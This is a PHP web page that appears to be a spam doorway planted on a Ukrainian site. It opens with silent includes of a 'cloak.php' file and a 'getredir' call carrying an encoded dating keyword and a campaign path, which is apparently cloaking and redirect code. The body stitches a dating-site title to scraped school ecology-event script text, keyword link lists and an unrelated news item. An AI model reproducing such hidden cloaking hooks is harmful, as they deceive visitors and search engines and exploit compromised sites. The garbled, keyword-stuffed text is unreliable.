<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d0%bc%d1%96%d1%81%d1%82%d0%be+%d0%be%d0%bd%d0%bb%d0%b0%d0%b9%d0%bd+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2%d0%b0+%d0%bf%d0%be%d0%b1%d0%bb%d0%b8%d0%b7%d1%83+%d0%9d%d0%be%d0%b2%d0%be%d0%bc%d0%be%d1%81%d0%ba%d0%be%d0%b2%d1%81%d1%8c%d0%ba+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Як знайомитися в інтернеті: ставте високу планку, будьте лаконічними і терплячими</title>
	<meta name="description" content="Сайт знайомств Новомосковськ ❤ Безкоштовна реєстрація. Знайомства для спілкування, серйозних відносин, створення сім'ї, флірту і дружби." />
	<link rel="canonical" href="https://masage.od.ua/img/106/bipim-msto-onlayn-znayomstva.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/280/vyly-plyazh-pdklyuchiti-v.php">пляж підключити в Городня Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/406/gic-sayti-znayomstv.php">сайти знайомств місто поблизу Теплодар Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/loru-zona-znayomstv-v.php">зона знайомств в Ізмаїл Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/457/xoh-regon-znayomstv-v.php">регіон знайомств в Часів Яр Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Місто онлайн знайомства поблизу Новомосковськ Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Методичне об'єднання вчителів гуманітарного циклу. Методичне об'єднання класних керівників. Виховна робота. Семінари, конференції, педради. Головна » Методична робота » Методичне об'єднання вчителів природничо-математичного циклу. Матеріально-технічне забезпечення: ноутбук, мультимедійний пристрій, презентація «Живе обличчя моєї землі», відеофільми, соціальна реклама,музичне оформлення, виставка тематичних фото та літератури. Вступне слово учителя: Доброго дня!</p>
<p>Я хочу розпочати наш захід із слів Джеральда Дарелла: «Ми отримали в спадок невимовно прекрасний і багатообразний сад, але біда наша в тому, що ми погані садівники, що не засвоїли найпростіших правил садівництва. Із зневагою ставлячись до цього саду, ми робимо це з багатодушним самозадоволенням неповнолітнього ідіота, який шматує ножицями картину Рембранта». Перегляд презентації про Землю 1. Перегляд відеоролику «Наш дом планета Земля» 2. Звучить пісня "Ти - Земле моя» у виконанні С. На планеті, що дарує найщиріші почуття і щастя тим, хто шанує, любить та оберігає її!</p>
<p>Учень1:Земле рідна! Якою красою, якими барвами радуєш,Якими пахощами вітаєш! Ти даєш нам хліб і до хліба. Стелиш під ноги трави і квіти. Напинаєш над головою голубе небо із ясним сонечкомЯк не любити тебе?! Як не берегти краси твоєї,Не примножувати її?</p><a id='x1'></a><h3>Онлайн-знайомства в цифрах</h3><p>Ведучий2:Планета Земля - наш спільний дім. А людина була частиною природи і частиною Землі. Окутана тонким блакитним серпанком атмосфери, як коштовний діамант сяє на фоні чорного вакууму Космосу». Ведучий3:Земля… Яка вона? Земля породжує джерельця і стрімкі потоки, трави і дерева. Вона тримає на собі океани, ганяє хмари та грається їхніми тінями. Приймає всі дощі, сніги, тумани. Вона розкривається жерлами вулканів, запускає птахів у небо, радіє кожній пташці і тварині. Ведучий4: «Земля — колиска розуму, але не можна вічно жити у колисці. Більше того, Земля лише одна з планет, де можливе життя.</p>
<p>Вихід у космос — матеріальна основа відтворення майбутнього людства». Знищуємо природу — значить знищуємо самі себе. Ведучий5: Земля — колиска людства. Давайте спробуємо зазирнути в обличчя нашої планети, побачити яка вона, … як співає…, радіє, … почути як плаче… , як стогне від болю, якого їй завдають люди..</p><a id='x2'></a><h3>Мандруємо Україною</h3><p>Ведучий6: «Дивлячись на Землю з космосу, ти розумієш, що всі ми, незалежно від того, на якому континенті живемо, і в якому місті, всі ми - брати і сестри, Земля - наш спільний дім, який ми повинні оберігати і про який повинні піклуватися». Її обличчя під впливом діяльності людини постійно змінюється.</p><img src="https://img01.obyava.ua/classified/0/1196/3126/200-qp9vqc757cmohd4l.jpg" alt="Секрет успіху - пишіть лаконічно" style="max-width: 480px; max-height: 480px;"/><p>Ми - люди XXІ століття - майже ненароком для себе раптом опинились у подвійній ролі свідків і винуватців катастрофічних змін на Землі. Ведучий квітня. Цей день — нагадування про екологічні катастрофи, день, коли кожна людина має можливість замислитися над тим, що вона може зробити для вирішення екологічних проблем.</p>
<p>В цей день кожен мешканець планети може зробити свій маленький внесок у справу захисту навколишнього середовища: очистити від сміття прилеглі території, висадити хоча б одне дерево, відмовитися хоча б на день від використання автомобіля. Ведучий 2.</p>
		
			<br><ul>
			
				<li>Гуртки відділу?</li>
			
				<li>Новомосковськ. ЗЗСО № 1 - Методичне об'єднання вчителів природничо-математичного циклу.</li>
			
				<li>Дніпропетровська філармонія ім. Л. Когана?</li>
			
				<li>сватання мільйонера Вишневе Україна.</li>
			
				<li>Квитки в театр Дніпро 2021?</li>
			
				<li>найкращі додатки для знайомств поблизу Житомир Україна!</li>
			
			</ul>
		
	<p>Весь наш сьогоднішній добробут, наш поступ у завтра передусім залежить від землі. Від її щедрості, її безсмертя. Як зберегти нам живу силу землі, її вічну родючість? Як примножити плоди землі, досягти того, щоб нива наша завтра була багатішою? Це складне питання стоїть перед нами і вимагає його розв'язання.</p>
		
			<br><ul>
			
				<li>Тіндер | Знайомся, зустрічайся та знаходь нових друзів;</li>
			
				<li>швидкісні знайомства понад 50 дюймів Підгородне Україна!</li>
			
				<li>Знайомства - Надвірна та Надвірнянський район.</li>
			
				<li>західні побачення Тростянець Україна.</li>
			
				<li>джерела знайомств в Миколаїв Україна!</li>
			
				<li>бісексуальні знайомства в Переяслав Україна!</li>
			
			</ul>
		
	<p>Ведучий3:Спілкування з природою просто дає нам радість. Мабуть тому. Травинка, що вперто пробивається крізь сірий асфальт, громаддя гір, ширяння орла або політ бджоли, нічні співи солов'я або вигин лебединої шиї, безодня нічного зоряного неба— все це несе в собі невичерпний заряд краси. І все це таке близьке і дороге людському серцю. Ведучий4: Для кожного з нас слово "природа" пов'язане насамперед з пейзажами рідного краю, того куточка землі, де минули дитячі роки, де мамина колискова пісня зливалася з шумом дерев за вікном.</p>
<p>На все життя ті краєвиди закарбовуються в пам'яті, серці, душі незабутніми спогадами. Для когось це білокорі, стрункі берізки чи трепетні тополі, для інших - барвисто уквітчана килимами трава чи смарагдове руно гірської полонинВчитель: Щоб зберегти природу і наше життя, ми повинні з повагою та обдумано відноситися до братів наших менших. Дякую всім,хто прийняв активну участь у конкурсі «Стоп-кадр», на стенді вивішені ці роботи. То ж всім людям на Землі потрібно також піклуватися про братів наших менших.</p>
<p>Звучить «Гімн екологів». Ведучи5:Але ніколи Людина не відчувала такої тривоги за наш спільний дім, як в останні десятиріччя. А скільки ще навколо видимих і невидимих слідів нерозумної діяльності людини.</p>
		
			
				<div>В Умані інтернет знайомство з подружньою парою закінчилося катуванням із сексуальним підтекстом</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/FQZGI1usk3Q' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Ерозія грунтів, кислотні дощі, озонові дірки… Дедалі більше забруднюється атмосфера, гідросфера та літосфера, накопичений великий обсяг відходів людської діяльності при одночасному виснаженні майже всіх природних ресурсів. Учень2:Зупинися , людино, на мить…І відчуй, як планеті болить. Як із серця крик вирина —Зупинися, Земля в нас одна! Як у серці тліє любов,Щоб колись розгорітися знов.</p>
<p>Зупинися , людино, на мить…І відчуй, як планеті болить. Ведучий 6: Небачено активна й здебільшого непродумана діяльність людини, супроводжувана знищенням природних ресурсів і забрудненням навколишнього середовища, призвела до того, що нині наша планета перебуває в критичному стані, коли до глобальної катастрофи залишилися лічені кроки. Але через свої хибні моральні принципи, духовне зубожіння, деградацію екологічної свідомості і совісті ми знову опинилися на порозі нового, чи не найжахливішого етапу виживання — екологічної кризи.</p>
<p>Ведучий 1. Глобальне знищення природи — то лише побічний результат згубної діяльності суспільства. Екологічна драма розгортається на наших очах.</p><strong><a id='x3'></a><h2>Афіша в Дніпрі (у Дніпропетровську) — купити квитки на заходи онлайн на </h2></strong><p>Ми бачимо це, розуміємо, що це дуже серйозно, але чому ж тоді не припиняється цей страшний "марафон", що неминуче приведе людство до загибелі? Екологічна ситуація вже близька до критичної. Ведучий2: Потрібні нові ідеї, зусилля і колосальні матеріальні витрати, щоб зупинити катастрофу. Тому ставлення людини до природи нині набуває такого самого морального значення, як і ставлення людини до людини. Стогне Земля, не вщухає її біль, не загоюються її рани. І все це стукає в двері наших домівок захворюваннями, спустошеннями землі.</p>
<p>Земля нам подає сигнал «SOS». Відеокліп Поліни Бурло «Ах, если бы Земля умела говорить! Ми, люди, так тебе образили. Луна крізь твій надривний плач,Бо болю ми твого не бачили. Вважали ми, що так і треба! Палили, нищили, сушили і рубали. І ось за це нам тепер нагорода:Квітучу нашу Землю не впізнати. Вона у чаді та диму,Зникають звірі, висихають ріки. Вони теж хочуть житиІ милуватися красотами Землі… Вчитель: На стенді ви бачили кольорові фото з рурики «Цей світ створила людина». Саме людина, винна в тому , що накоїла. Дякую учням, які знайшли фото,які підтверджують, що таке можна було зробити тільки розумній істоті, так понівечити і знищити природу може тільки людина.</p>
<p>Найактивніше перейнялися цією пролемою учні 6 і 7 класів, активними були учні 8класу, приймали учні 10 класу. Ведучий 4:По-материнськи щедро наділила природа своїми безцінними багатствами і красою українську землю. Та, на жаль, сьогодні на кожному кроці видно наслідки нашого бездумного споживацького, зрештою варварського, ставлення до неї. Чому так відбувається?</p>
<p>Чому люди знищують свій дім?</p><strong><a id='x4'></a><h2>Заиченко Оксана Владимировна</h2></strong><p>Чи розуміють вони наслідки своїх дій? Учениця 4:Я б вигадала іншу Україну,Якби Її на світі не було Її плекала б, мов малу дитину,Щоб українство мальвами цвіло. Я б на коліна стала перед Богом,Молилася б за Неї день і ніч. Я відшукала б зоряну дорогу. Для Неї запалила б сотні свіч.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/457/bubom-sayt-znayomstv-z.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/406/weto-povniy-pdklyuchennya.php">повний підключення кемпінгів Вінниця Україна</a></li><li><a href="https://masage.od.ua/img/137/tyq-znayomstva-dlya.php">знайомства для одиноких людей в Татарбунари Україна</a></li><li><a href="https://masage.od.ua/img/291/ruk-naykrash-sayti-znayomstv.php">найкращі сайти знайомств в Інтернеті Нова Одеса Україна</a></li><li><a href="https://masage.od.ua/img/103/dac-kompanya-znayomstv-sumi.php">компанія знайомств Суми Україна</a></li><li><a href="https://masage.od.ua/img/361/pesi-ponad-50-shvidksnih.php">понад 50 швидкісних побачень Добропілля Україна</a></li><li><a href="https://masage.od.ua/img/494/niqa-msto-shvidksnih-znayomstv.php">місто швидкісних знайомств поблизу Кілія Україна</a></li><li><a href="https://masage.od.ua/img/103/zax-bezkoshtovn-sayti-znayomstv.php">безкоштовні сайти знайомств місто в Євпаторія Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#x1'>Онлайн-знайомства в цифрах</a></li>
<li><a href='#x2'>Мандруємо Україною</a></li>
<li><a href='#x3'>Афіша в Дніпрі (у Дніпропетровську) — купити квитки на заходи онлайн на </a></li>
<li><a href='#x4'>Заиченко Оксана Владимировна</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/457/wexu-veb-sayt-pdklyuchennya.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>